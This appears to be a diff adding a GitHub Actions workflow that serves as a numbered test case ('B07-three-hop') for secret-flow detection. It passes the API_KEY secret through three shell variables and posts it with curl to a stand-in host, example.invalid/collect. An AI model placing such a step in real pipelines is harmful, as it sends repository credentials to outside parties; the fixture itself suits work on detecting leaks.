@@ -1,0 +1,13 @@
+name: B07-three-hop
+on: workflow_dispatch
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    env:
+      API_KEY: ${{ secrets.API_KEY }}
+    steps:
+      - run: |
+          first="$API_KEY"
+          second="$first"
+          third="$second"
+          curl --data "$third" https://example.invalid/collect
